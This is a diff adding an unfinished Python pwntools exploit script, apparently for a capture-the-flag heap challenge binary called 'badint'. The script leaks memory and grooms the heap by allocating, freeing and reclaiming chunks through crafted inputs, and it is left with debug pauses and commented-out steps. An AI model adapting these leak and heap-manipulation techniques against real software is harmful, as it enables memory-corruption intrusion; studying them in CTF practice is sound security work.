@@ -1,0 +1,60 @@
+from pwn import *
+
+
+r = process('badint', env={'LD_PRELOAD': "libc6.so"})
+
+def leak():
+    seq, offset, data = 0, 0, 'A' * 0x100
+    print r.recvuntil('SEQ #:')
+    r.send(str(seq) + '\n')
+
+    print r.recvuntil('Offset:')
+    r.send(str(offset) + '\n')
+
+    print r.recvuntil('Data:')
+    r.send(str(data.encode('hex')) + '\n')
+
+    print r.recvuntil('Error, call graph (')
+    # r.interactive()
+    # r.recvuntil('Error, call graph (')
+
+
+def add_item(seq, offset, data, show=False):
+    print r.recvuntil('SEQ #:')
+    r.send(str(seq) + '\n')
+
+    print r.recvuntil('Offset:')
+    r.send(str(offset) + '\n')
+
+    print r.recvuntil('Data:')
+    r.send(str(data.encode('hex')) + '\n')
+
+    s_show = 'Yes' if show else 'No'
+    print r.recvuntil('LSF Yes/No:')
+    r.send(str(s_show) + '\n')
+
+# for i in xrange(20):
+leak()
+
+def leak2():
+    add_item(0, 0x00, 'A' * 0xff, False)        # Object to use
+    add_item(1, 0x00, 'B' * (0x60 - 9), False)   # Allocate and free a small object
+    add_item(1, 0x00, 'C' * (0x70 - 9), True)   # Allocate and free a small object
+    add_item(0, 0xFF, 'A', True)                 # Free first object
+    add_item(1, 0x00, 'C' * (0x70 -9), False)   # Reclaim object
+    raw_input('asd')
+    add_item(1, 0x100, 'B' * (0x60 - 9), True)   # Allocate and free a small object
+
+
+
+leak2()
+ 
+# add_item(0, 0x00, 'B' * 0xff, False)
+#raw_input('adsf')
+
+#add_item(0, 0x00, 'B' * 0xff, True)
+#add_item(1, 0xff, 'C' * 0xff, True)
+
+# add_item(0, 0xffff, 'C' * 0xff, True)
+
+#raw_input('asdf')
